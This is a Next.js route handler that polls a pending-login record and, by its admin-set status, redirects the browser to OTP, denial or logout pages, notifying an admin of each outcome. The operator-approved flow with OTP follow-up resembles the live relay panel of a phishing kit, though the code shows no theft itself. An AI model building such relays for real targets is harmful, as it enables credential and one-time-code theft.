import { NextRequest, NextResponse, after } from "next/server"
import { getPendingLogin } from '@/lib/pending-logins'
import { claimAndSendAdminLoginOutcome } from '@/lib/pending-login-outcome-notify'

const WAIT_SEC = 1
const TIMEOUT_MS = 90_000

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const { id } = await params
  const method = (request.nextUrl.searchParams.get('method') || 'email') as 'email' | 'text'
  const step = request.nextUrl.searchParams.get('step')

  const record = await getPendingLogin(id)
  if (!record) {
    const fallback = step === 'otp' ? '/login/verify-code' : '/login/2fa-verify'
    return NextResponse.redirect(new URL(fallback, request.url), 302)
  }

    after(async () => {
      try {
        await claimAndSendAdminLoginOutcome(id)
      } catch (notifyErr) {
        console.error("[pending-login] admin outcome notify:", notifyErr)
      }
    })

  const headers = {
    'Cache-Control': 'no-store, no-cache, must-revalidate',
    Pragma: 'no-cache',
  }

  if (record.status === 'redirected') {
    return NextResponse.redirect(new URL('/api/login-out', request.url), { status: 302, headers })
  }

  if (record.status === 'approved') {
    if (step === 'otp') {
      return NextResponse.redirect(new URL('/api/login-out', request.url), { status: 302, headers })
    }
    const verifyPath = `/login/verify-code?method=${encodeURIComponent(record.method || method)}`
    const origin = new URL(request.url).origin
    const target = `${origin}${verifyPath}`
    const html = `<!DOCTYPE html><html><head><meta charset="utf-8"/><script>
try{var s=sessionStorage;var c=Number(s.getItem('flow_max_step')||'0');if(2>c){s.setItem('flow_max_step','2');}}
catch(e){}
window.top.location.href=${JSON.stringify(target)};
</script></head><body></body></html>`
    return new NextResponse(html, {
      status: 200,
      headers: { ...headers, 'Content-Type': 'text/html; charset=utf-8' },
    })
  }

  if (record.status === 'denied') {
    if (step === 'otp') {
      const url = new URL('/login/verify-code', request.url)
      url.searchParams.set('denied', '1')
      url.searchParams.set('method', record.method || method)
      return NextResponse.redirect(url, { status: 302, headers })
    }
    return NextResponse.redirect(new URL('/api/login-denied', request.url), {
      status: 302,
      headers,
    })
  }

  if (Date.now() - record.createdAt > TIMEOUT_MS) {
    if (step === 'otp') {
      const url = new URL('/login/verify-code', request.url)
      url.searchParams.set('timeout', '1')
      url.searchParams.set('method', record.method || method)
      return NextResponse.redirect(url, { status: 302, headers })
    }
    return NextResponse.redirect(
      new URL('/api/login-denied?reason=timeout', request.url),
      { status: 302, headers }
    )
  }

  const waitUrl = new URL(request.url)
  waitUrl.searchParams.set('method', method)
  if (step === 'otp') waitUrl.searchParams.set('step', 'otp')
  const refreshUrl = waitUrl.pathname + waitUrl.search
  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"/><meta http-equiv="refresh" content="${WAIT_SEC};url=${refreshUrl}"/></head><body></body></html>`

  return new NextResponse(html, {
    status: 200,
    headers: {
      ...headers,
      'Content-Type': 'text/html; charset=utf-8',
    },
  })
}
